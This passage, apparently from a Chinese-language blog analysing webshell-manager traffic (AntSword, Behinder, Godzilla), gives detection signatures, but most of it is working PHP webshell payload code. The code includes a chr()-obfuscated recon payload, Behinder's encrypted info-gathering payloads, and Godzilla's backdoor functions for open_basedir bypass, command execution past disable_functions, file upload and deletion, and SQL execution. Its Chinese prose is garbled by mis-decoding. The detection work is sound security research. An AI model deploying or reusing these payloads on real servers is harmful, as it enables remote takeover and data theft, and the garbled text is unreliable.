hR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x7b).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x3d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x74).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x65).ChR(0x6e).ChR(0x64).ChR(0x5f).ChR(0x63).ChR(0x6c).ChR(0x65).ChR(0x61).ChR(0x6e).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x39).ChR(0x34).ChR(0x31).ChR(0x39).ChR(0x37).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x40).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x66).ChR(0x66).ChR(0x33).ChR(0x65).ChR(0x32).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x73).ChR(0x74).ChR(0x61).ChR(0x72).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x74).ChR(0x72).ChR(0x79).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x53).ChR(0x43).ChR(0x52).ChR(0x49).ChR(0x50).ChR(0x54).ChR(0x5f).ChR(0x46).ChR(0x49).ChR(0x4c).ChR(0x45).ChR(0x4e).ChR(0x41).ChR(0x4d).ChR(0x45).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x3d).ChR(0x22).ChR(0x22).ChR(0x29).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x50).ChR(0x41).ChR(0x54).ChR(0x48).ChR(0x5f).ChR(0x54).ChR(0x52).ChR(0x41).ChR(0x4e).ChR(0x53).ChR(0x4c).ChR(0x41).ChR(0x54).ChR(0x45).ChR(0x44).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x3d).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x7d).ChR(0x9).ChR(0x22).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x73).ChR(0x75).ChR(0x62).ChR(0x73).ChR(0x74).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x2c).ChR(0x30).ChR(0x2c).ChR(0x31).ChR(0x29).ChR(0x21).ChR(0x3d).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x29).ChR(0x7b).ChR(0x66).ChR(0x6f).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x72).ChR(0x61).ChR(0x6e).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x22).ChR(0x43).ChR(0x22).ChR(0x2c).ChR(0x22).ChR(0x5a).ChR(0x22).ChR(0x29).ChR(0x61).ChR(0x73).ChR(0x20).ChR(0x24).ChR(0x4c).ChR(0x29).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x69).ChR(0x73).ChR(0x5f).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x4c).ChR(0x7d).ChR(0x3a).ChR(0x22).ChR(0x29).ChR(0x29).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x4c).ChR(0x7d).ChR(0x3a).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x65).ChR(0x6c).ChR(0x73).ChR(0x65).ChR(0x7b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x22).ChR(0x3b).ChR(0x24).ChR(0x75).ChR(0x3d).ChR(0x28).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x5f).ChR(0x65).ChR(0x78).ChR(0x69).ChR(0x73).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x22).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x65).ChR(0x67).ChR(0x69).ChR(0x64).ChR(0x22).ChR(0x29).ChR(0x29).ChR(0x3f).ChR(0x40).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x70).ChR(0x77).ChR(0x75).ChR(0x69).ChR(0x64).ChR(0x28).ChR(0x40).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x65).ChR(0x75).ChR(0x69).ChR(0x64).ChR(0x28).ChR(0x29).ChR(0x29).ChR(0x3a).ChR(0x22).ChR(0x22).ChR(0x3b).ChR(0x24).ChR(0x73).ChR(0x3d).ChR(0x28).ChR(0x24).ChR(0x75).ChR(0x29).ChR(0x3f).ChR(0x24).ChR(0x75).ChR(0x5b).ChR(0x22).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x22).ChR(0x5d).ChR(0x3a).ChR(0x40).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x75).ChR(0x72).ChR(0x72).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x5f).ChR(0x75).ChR(0x73).ChR(0x65).ChR(0x72).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x70).ChR(0x68).ChR(0x70).ChR(0x5f).ChR(0x75).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x7b).ChR(0x24).ChR(0x73).ChR(0x7d).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x24).ChR(0x52).ChR(0x3b).ChR(0x3b).ChR(0x7d).ChR(0x63).ChR(0x61).ChR(0x74).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x45).ChR(0x78).ChR(0x63).ChR(0x65).ChR(0x70).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x65).ChR(0x29).ChR(0x7b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x45).ChR(0x52).ChR(0x52).ChR(0x4f).ChR(0x52).ChR(0x3a).ChR(0x2f).ChR(0x2f).ChR(0x22).ChR(0x2e).ChR(0x24).ChR(0x65).ChR(0x2d).ChR(0x3e).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x4d).ChR(0x65).ChR(0x73).ChR(0x73).ChR(0x61).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x64).ChR(0x69).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b)); å‚æ•°ç‰¹å¾ POST: default &amp; chr &amp; chr16: 0x[0-9a-f]&#123;13&#125; base64 &amp; rot13: _0x[0-9a-f]&#123;13&#125; æµé‡ç‰¹å¾ default: @ini_set(â€œdisplay_errorsâ€,â€œ0â€);â€¦ base64: QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jzâ€¦ rot13: @vav_frg(â€œqvfcynl_reebefâ€, â€œ0â€);â€¦ chr: eVAl cHr(\\d+) ChR(\\d+)(å¤§é‡) chr16: eVAl cHr(0x[0-9a-f]&#123;2&#125;) ChR(0x[0-9a-f]&#123;2&#125;)(å¤§é‡) å†°è å†°èæ”¯æŒä¸¤ç§æµé‡åŠ å¯†æ–¹å¼ AES-128-CBC XOR é»˜è®¤ç»™å‡ºçš„å†°èShellä¼˜å…ˆé‡‡ç”¨AES-128-CBCçš„åŠ å¯†æ–¹å¼ å†°èçš„äº¤äº’è¿‡ç¨‹å¦‚ä¸‹ å®¢æˆ·ç«¯é€šè¿‡æºå¸¦GETå‚æ•°è¿›è¡Œè¯·æ±‚ æœåŠ¡ç«¯æ¥æ”¶åˆ°GETå‚æ•°ä¹‹åäº§ç”Ÿ16å­—èŠ‚å¯†é’¥ï¼ˆHexï¼‰ å®¢æˆ·ç«¯è·å¾—å¯†é’¥ä¹‹åå¯¹ä¹‹åçš„Payloadè¿›è¡ŒåŠ å¯† è¿æ¥æµé‡ AES-128-CBC éšæœºç”Ÿæˆcontentï¼Œå°†Payloadå‘é€è‡³æœåŠ¡ç«¯å¹¶å°†è¿è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ ç”¨äºéªŒè¯æœåŠ¡ç«¯æ˜¯å¦æ”¯æŒåˆ†ç»„åŠ å¯† 12345678910111213141516171819202122232425262728@error_reporting(0);function main($content)&#123; $result = array(); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($content); $key = $_SESSION[&#x27;k&#x27;]; echo encrypt(json_encode($result),$key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$content=&quot;9245a461-fd2f-44be-a6f1-721c392f0b75&quot;;main($content);# &#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;OTI0NWE0NjEtZmQyZi00NGJlLWE2ZjEtNzIxYzM5MmYwYjc1&quot;&#125;# &#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;9245a461-fd2f-44be-a6f1-721c392f0b75&quot;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445error_reporting(0);function main() &#123; ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) &#123; for($i=65;$i&lt;=90;$i++) &#123; $drive=chr($i).&#x27;:/&#x27;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&#x27;&#x27;; &#125; &#125; else &#123; $driveList=&quot;/&quot;; &#125; $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&#x27;k&#x27;]; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); echo encrypt(json_encode($result), $key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;main();# phpinfoç­‰ä¿¡æ¯ XOR å…ˆå‘é€ä¸€ä¸ªéªŒè¯æ€§Payloadï¼Œå³AES-128-CBCä¸­çš„ContentéªŒè¯ æ­¤æ—¶æœªé€šè¿‡éªŒè¯ï¼Œåˆ™å®¢æˆ·ç«¯ä½¿ç”¨XORåŠ å¯†æ–¹å¼ 123456789101112131415161718192021222324252627282930313233343536373839404142434445error_reporting(0);function main() &#123; ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) &#123; for($i=65;$i&lt;=90;$i++) &#123; $drive=chr($i).&#x27;:/&#x27;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&#x27;&#x27;; &#125; &#125; else &#123; $driveList=&quot;/&quot;; &#125; $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&#x27;k&#x27;]; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); echo encrypt(json_encode($result), $key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;main();# phpinfoç­‰ä¿¡æ¯ å‚æ•°ç‰¹å¾ æ— å‚æ•° æµé‡ç‰¹å¾ Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 è¯·æ±‚ä¸­GETå‚æ•°å€¼ä¸ºä¸‰ä½æ•°å­—ï¼Œä¸”æœåŠ¡å™¨å“åº”ä¸º[0-9a-f]&#123;16&#125;ï¼ˆé’ˆå¯¹è¿æ¥æ—¶çš„æµé‡ï¼‰ å“¥æ–¯æ‹‰ è¿æ¥æµé‡ å®¢æˆ·ç«¯å°†å‡½æ•°ä»£ç åŠ å¯†åå‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å°†å‡½æ•°å­˜å‚¨äºSessionæ–‡ä»¶ä¹‹ä¸­ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391$parameters=array();function run($pms)&#123; formatParameter($pms.&#x27;&amp;ILikeYou=&#x27;.base64Encode(&#x27;metoo&#x27;)); if ($_SESSION[&quot;bypass_open_basedir&quot;]==true)&#123; @bypass_open_basedir(); &#125; return base64Encode(evalFunc());&#125;function bypass_open_basedir()&#123; if(!@file_exists(&#x27;bypass_open_basedir&#x27;))&#123; @mkdir(&#x27;bypass_open_basedir&#x27;); &#125; @chdir(&#x27;bypass_open_basedir&#x27;); @ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;); @$_Ei34Ww_sQDfq_FILENAME = @dirname($_SERVER[&#x27;SCRIPT_FILENAME&#x27;]); @$_Ei34Ww_sQDfq_path = str_replace(&quot;\\\\&quot;,&#x27;/&#x27;,$_Ei34Ww_sQDfq_FILENAME); @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,&#x27;/&#x27;) + 1; $_Ei34Ww_sQDfq_i = 0; while($_Ei34Ww_sQDfq_i &lt; $_Ei34Ww_sQDfq_num)&#123; @chdir(&#x27;..&#x27;); $_Ei34Ww_sQDfq_i++; &#125; @ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;); @rmdir($_Ei34Ww_sQDfq_FILENAME.&#x27;/&#x27;.&#x27;bypass_open_basedir&#x27;);&#125;function formatParameter($pms)&#123; global $parameters; $pms=explode(&quot;&amp;&quot;,$pms); foreach ($pms as $kv)&#123; $kv=explode(&quot;=&quot;,$kv); if (sizeof($kv)&gt;=2)&#123; $parameters[$kv[0]]=base64Decode($kv[1]); &#125; &#125;&#125;function evalFunc()&#123; @session_write_close(); $className=get(&quot;codeName&quot;); $methodName=get(&quot;methodName&quot;); if ($methodName!=null)&#123; if (strlen(trim($className))&gt;0)&#123; if ($methodName==&quot;includeCode&quot;)&#123; return includeCode(); &#125;else&#123; if (isset($_SESSION[$className]))&#123; return eval($_SESSION[$className]); &#125;else&#123; return &quot;&#123;$className&#125; no load&quot;; &#125; &#125; &#125;else&#123; return $methodName(); &#125; &#125;else&#123; return &quot;methodName Is Null&quot;; &#125;&#125;function deleteDir($p)&#123; $m=@dir($p); while(@$f=$m-&gt;read())&#123; $pf=$p.&quot;/&quot;.$f; @chmod($pf,0777); if((is_dir($pf))&amp;&amp;($f!=&quot;.&quot;)&amp;&amp;($f!=&quot;..&quot;))&#123; deleteDir($pf); @rmdir($pf); &#125;else if (is_file($pf)&amp;&amp;($f!=&quot;.&quot;)&amp;&amp;($f!=&quot;..&quot;))&#123; @unlink($pf); &#125; &#125; $m-&gt;close(); @chmod($p,0777); return @rmdir($p);&#125;function deleteFile()&#123; $F=get(&quot;fileName&quot;); if(is_dir($F))&#123; return deleteDir($F)?&quot;ok&quot;:&quot;fail&quot;; &#125;else&#123; return (file_exists($F)?@unlink($F)?&quot;ok&quot;:&quot;fail&quot;:&quot;fail&quot;); &#125;&#125;function copyFile()&#123; $srcFileName=get(&quot;srcFileName&quot;); $destFileName=get(&quot;destFileName&quot;); if (@is_file($srcFileName))&#123; if (copy($srcFileName,$destFileName))&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125; &#125;else&#123; return &quot;The target does not exist or is not a file&quot;; &#125;&#125;function moveFile()&#123; $srcFileName=get(&quot;srcFileName&quot;); $destFileName=get(&quot;destFileName&quot;); if (rename($srcFileName,$destFileName))&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function getBasicsInfo()&#123; $data = array(); $data[&#x27;OsInfo&#x27;] = @php_uname(); $data[&#x27;CurrentUser&#x27;] = @get_current_user(); $data[&#x27;CurrentUser&#x27;] = strlen(trim($data[&#x27;CurrentUser&#x27;])) &gt; 0 ? $data[&#x27;CurrentUser&#x27;] : &#x27;NULL&#x27;; $data[&#x27;disable_functions&#x27;] = (@ini_get(&#x27;disable_functions&#x27;)); $data[&#x27;disable_functions&#x27;] = strlen(trim($data[&#x27;disable_functions&#x27;])) &gt; 0 ? $data[&#x27;disable_functions&#x27;] : @get_cfg_var(&#x27;disable_functions&#x27;); $data[&#x27;timezone&#x27;] = @ini_get(&#x27;date.timezone&#x27;); $data[&#x27;encode&#x27;] = @ini_get(&#x27;exif.encode_unicode&#x27;); $data[&#x27;extension_dir&#x27;] = @ini_get(&#x27;extension_dir&#x27;); $data[&#x27;include_path&#x27;] = @ini_get(&#x27;include_path&#x27;); $data[&#x27;PHP_SAPI&#x27;] = PHP_SAPI; $data[&#x27;PHP_VERSION&#x27;] = PHP_VERSION; $data[&#x27;memory_limit&#x27;] = ini_get(&#x27;memory_limit&#x27;); $data[&#x27;upload_max_filesize&#x27;] = ini_get(&#x27;upload_max_filesize&#x27;); $data[&#x27;post_max_size&#x27;] = ini_get(&#x27;post_max_size&#x27;); $data[&#x27;max_execution_time&#x27;] = ini_get(&#x27;max_execution_time&#x27;); $data[&#x27;max_input_time&#x27;] = ini_get(&#x27;max_input_time&#x27;); $data[&#x27;default_socket_timeout&#x27;] = ini_get(&#x27;default_socket_timeout&#x27;); $data[&#x27;mygid&#x27;] = @getmygid(); $data[&#x27;mypid&#x27;] = @getmypid(); $data[&#x27;SERVER_SOFTWAREypid&#x27;] = @$_SERVER[&#x27;SERVER_SOFTWARE&#x27;]; $data[&#x27;SERVER_PORT&#x27;] = @$_SERVER[&#x27;SERVER_PORT&#x27;]; $data[&#x27;loaded_extensions&#x27;] = @implode(&#x27;,&#x27;, @get_loaded_extensions()); $data[&#x27;short_open_tag&#x27;] = @get_cfg_var(&#x27;short_open_tag&#x27;); $data[&#x27;short_open_tag&#x27;] = @(int)$data[&#x27;short_open_tag&#x27;] == 1 ? &#x27;true&#x27; : &#x27;false&#x27;; $data[&#x27;asp_tags&#x27;] = @get_cfg_var(&#x27;asp_tags&#x27;); $data[&#x27;asp_tags&#x27;] = (int)$data[&#x27;asp_tags&#x27;] == 1 ? &#x27;true&#x27; : &#x27;false&#x27;; $data[&#x27;safe_mode&#x27;] = @get_cfg_var(&#x27;safe_mode&#x27;); $data[&#x27;safe_mode&#x27;] = (int)$data[&#x27;safe_mode&#x27;] == 1 ? &#x27;true&#x27; : &#x27;false&#x27;; $data[&#x27;CurrentDir&#x27;] = str_replace(&#x27;\\\\&#x27;, &#x27;/&#x27;, @dirname($_SERVER[&#x27;SCRIPT_FILENAME&#x27;])); $data[&#x27;FileRoot&#x27;] = &#x27;&#x27;; if (substr(__FILE__, 0, 1) != &#x27;/&#x27;) &#123;foreach (range(&#x27;C&#x27;, &#x27;Z&#x27;) as $L)&#123; if (@is_dir(&quot;&#123;$L&#125;:&quot;))&#123; $data[&#x27;FileRoot&#x27;] .= &quot;&#123;$L&#125;:/;&quot;;&#125;&#125;;&#125;; $data[&#x27;FileRoot&#x27;] = (strlen(trim($data[&#x27;FileRoot&#x27;])) &gt; 0 ? $data[&#x27;FileRoot&#x27;] : &#x27;/&#x27;); $data[&#x27;FileRoot&#x27;]= substr_count($data[&#x27;FileRoot&#x27;],substr(__FILE__, 0, 1))&lt;=0?substr(__FILE__, 0, 1).&quot;:/&quot;:$data[&#x27;FileRoot&#x27;]; $result=&quot;&quot;; foreach($data as $key=&gt;$value)&#123; $result.=$key.&quot; : &quot;.$value.&quot;\\n&quot;; &#125; return $result;&#125;function getFile()&#123; $dir=get(&#x27;dirName&#x27;); $dir=(strlen(@trim($dir))&gt;0)?trim($dir):str_replace(&#x27;\\\\&#x27;,&#x27;/&#x27;,dirname(__FILE__)); $dir.=&quot;/&quot;; $path=$dir; $allFiles = @scandir($path); $data=&quot;&quot;; if ($allFiles!=null)&#123; $data.=&quot;ok&quot;; $data.=&quot;\\n&quot;; $data.=$path; $data.=&quot;\\n&quot;; foreach ($allFiles as $fileName) &#123; if ($fileName!=&quot;.&quot;&amp;&amp;$fileName!=&quot;..&quot;)&#123; $fullPath = $path.$fileName; $lineData=array(); array_push($lineData,$fileName); array_push($lineData,@is_file($fullPath)?&quot;1&quot;:&quot;0&quot;); array_push($lineData,date(&quot;Y-m-d H:i:s&quot;, @filemtime($fullPath))); array_push($lineData,@filesize($fullPath)); $fr=(@is_readable($fullPath)?&quot;R&quot;:&quot;&quot;).(@is_writable($fullPath)?&quot;W&quot;:&quot;&quot;).(@is_executable($fullPath)?&quot;X&quot;:&quot;&quot;); array_push($lineData,(strlen($fr)&gt;0?$fr:&quot;F&quot;)); $data.=(implode(&quot;\\t&quot;,$lineData).&quot;\\n&quot;); &#125; &#125; &#125;else&#123; return &quot;Path Not Found Or No Permission!&quot;; &#125; return $data;&#125;function readFileContent()&#123; $fileName=get(&quot;fileName&quot;); if (@is_file($fileName))&#123; if (@is_readable($fileName))&#123; return file_get_contents($fileName); &#125;else&#123; return &quot;No Permission!&quot;; &#125; &#125;else&#123; return &quot;File Not Found&quot;; &#125;&#125;function uploadFile()&#123; $fileName=get(&quot;fileName&quot;); $fileValue=get(&quot;fileValue&quot;); if (@file_put_contents($fileName,$fileValue)!==false)&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function newDir()&#123; $dir=get(&quot;dirName&quot;); if (@mkdir($dir,0777,true)!==false)&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function newFile()&#123; $fileName=get(&quot;fileName&quot;); if (@file_put_contents($fileName,&quot;&quot;)!==false)&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function execCommand()&#123; $result = &quot;&quot;; $command = get(&quot;cmdLine&quot;); $PadtJn = @ini_get(&#x27;disable_functions&#x27;); if (! empty($PadtJn)) &#123; $PadtJn = preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $PadtJn); $PadtJn = explode(&#x27;,&#x27;, $PadtJn); $PadtJn = array_map(&#x27;trim&#x27;, $PadtJn); &#125; else &#123; $PadtJn = array(); &#125; if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27;)) &#123; $command = $command . &quot; 2&gt;&amp;1\\n&quot;; &#125; if (is_callable(&#x27;system&#x27;) and ! in_array(&#x27;system&#x27;, $PadtJn)) &#123; ob_start(); system($command); $result = ob_get_contents(); ob_end_clean(); &#125; else if (is_callable(&#x27;proc_open&#x27;) and ! in_array(&#x27;proc_open&#x27;, $PadtJn)) &#123; $handle = proc_open($command, array(array(&#x27;pipe&#x27;,&#x27;r&#x27;),array(&#x27;pipe&#x27;,&#x27;w&#x27;),array(&#x27;pipe&#x27;,&#x27;w&#x27;)),$pipes); $result = NULL; while (! feof($pipes[1])) &#123; $result .= fread($pipes[1], 1024); &#125; @proc_close($handle); &#125; else if (is_callable(&#x27;passthru&#x27;) and ! in_array(&#x27;passthru&#x27;, $PadtJn)) &#123; ob_start(); passthru($command); $result = ob_get_contents(); ob_end_clean(); &#125; else if (is_callable(&#x27;shell_exec&#x27;) and ! in_array(&#x27;shell_exec&#x27;, $PadtJn)) &#123; $result = shell_exec($command); &#125; else if (is_callable(&#x27;exec&#x27;) and ! in_array(&#x27;exec&#x27;, $PadtJn)) &#123; $result = array(); exec($command, $result); $result = join(chr(10), $result) . chr(10); &#125; else if (is_callable(&#x27;exec&#x27;) and ! in_array(&#x27;popen&#x27;, $PadtJn)) &#123; $fp = popen($command, &#x27;r&#x27;); $result = NULL; if (is_resource($fp)) &#123; while (! feof($fp)) &#123; $result .= fread($fp, 1024); &#125; &#125; @pclose($fp); &#125; else &#123; return &quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;; &#125; return $result;&#125;function execSql()&#123; $dbType=get(&quot;dbType&quot;); $dbHost=get(&quot;dbHost&quot;); $dbPort=get(&quot;dbPort&quot;); $username=get(&quot;dbUsername&quot;); $password=get(&quot;dbPassword&quot;); $execType=get(&quot;execType&quot;); $execSql=get(&quot;execSql&quot;); function mysql_exec($host,$port,$username,$password,$execType,$sql)&#123; // åˆ›å»ºè¿æ¥ $conn = new mysqli($host,$username,$password,&quot;&quot;,$port); // Check connection if ($conn-&gt;connect_error) &#123; return $conn-&gt;connect_error; &#125; $result = $conn-&gt;query($sql); if ($conn-&gt;error)&#123; return $conn-&gt;error; &#125; $result = $conn-&gt;query($sql); if ($execType==&quot;update&quot;)&#123; return &quot;Query OK, &quot;+$conn-&gt;affected_rows+&quot; rows affected&quot;; &#125;else&#123; $data=&quot;ok\\n&quot;; while ($column = $result-&gt;fetch_field())&#123; $data.=base64_encode($column-&gt;name).&quot;\\t&quot;; &#125; $data.=&quot;\\n&quot;; if ($result-&gt;num_rows &gt; 0) &#123; // è¾“å‡ºæ•°æ® while($row = $result-&gt;fetch_assoc()) &#123; foreach ($row as $value)&#123; $data.=base64_encode($value).&quot;\\t&quot;; &#125; $data.=&quot;\\n&quot;; &#125; &#125; return $data; &#125; &#125; function pdoExec($databaseType,$host,$port,$username,$password,$execType,$sql)&#123; try &#123; $conn = new PDO(&quot;&#123;$databaseType&#125;:host=$host;port=&#123;$port&#125;;&quot;, $username, $password); // è®¾ç½® PDO é”™è¯¯æ¨¡å¼ä¸ºå¼‚å¸¸ $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); if ($execType==&quot;update&quot;)&#123; return 